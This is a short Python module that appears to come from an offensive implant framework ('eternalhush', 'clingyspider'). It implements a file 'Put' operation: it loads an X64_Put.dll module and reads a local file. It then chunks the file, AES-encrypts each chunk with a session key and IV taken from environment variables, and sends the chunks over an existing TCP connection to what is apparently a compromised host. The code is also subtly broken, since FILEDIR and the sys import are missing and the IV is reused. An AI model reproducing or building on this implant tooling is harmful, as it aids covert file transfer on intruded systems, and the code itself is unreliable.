import eternalhush as eh
from additional import clingyspider
import os

import time

FILEINFO = {
    "part_count": eh.SHORT,
    "file_size": eh.SHORT,
    "padding": 12
}

FILEPART = {
    "part_length": eh.SHORT,
    "file_part": 4094
}

def main(args):
    source_file = args[0]
    destination_file = args[1]
    
    clingyspider.ExecuteModule(os.path.join(FILEDIR, "X64_Put.dll"), args=[destination_file])
    
    try:
        with open(source_file, "rb") as f:
            content = f.read()
            content = bytearray(content)
    except IOError:
        eh.ui.Echo("Error while opening the file", eh.ECHO_ERROR)
        return  
    
    file_part_list = list()
    for i in range(0, len(content), 4094):
        file_part_list.append(content[i:i+4094])
    
    connection = int(eh.ui.GetEnv("CLSP_CONNECTION"))
    session_key = bytearray.fromhex(eh.ui.GetEnv("CLSP_KEY"))
    next_iv = bytearray.fromhex(eh.ui.GetEnv("CLSP_IV"))
    
    file_info = eh.data.Struct(FILEINFO)
    file_info.part_count = len(file_part_list)
    file_info.file_size = len(content)
    
    encrypted_fileinfo = eh.crypto.EncryptAesData(session_key, next_iv, file_info.data())

    eh.net.TcpSend(connection, encrypted_fileinfo)
    
    for part in file_part_list:
        file_part = eh.data.Struct(FILEPART)
        file_part.part_length = len(part)
        file_part.file_part = part
        encrypted_filepart = eh.crypto.EncryptAesData(session_key, next_iv, file_part.data())
        eh.net.TcpSend(connection, encrypted_filepart)
    
if __name__ == "__main__":
    main(sys.argv)